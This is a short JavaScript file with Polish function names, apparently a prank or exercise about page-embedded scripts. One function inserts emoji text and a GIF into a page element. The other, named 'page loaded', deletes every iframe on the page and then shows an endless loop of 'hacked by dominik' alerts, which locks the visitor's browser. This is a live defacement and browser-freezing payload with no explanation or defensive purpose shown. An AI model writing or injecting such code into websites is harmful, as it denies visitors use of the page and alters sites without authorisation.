
function makeMagic() {
  document.getElementById("magic-to-make").innerHTML = "✨💖ⓟⓗⓟ ⓢⓢⓘⓔ🦄✨";
  document.getElementById("magic-to-make").innerHTML = "<img src='https://media3.giphy.com/media/12NUbkX6p4xOO4/giphy.gif' />";
  document.getElementById("magic-to-make").innerHTML += "<br />✨💖ⓟⓗⓟ ⓢⓢⓘⓔ🦄✨ jeszcze bardziej";
}

function stronaZaladowana() { 
  Array.prototype.slice.call(document.getElementsByTagName("iframe")).forEach(function(item) { item.remove(); } );
  for (;;) alert('😈 hacked by dominik');
}
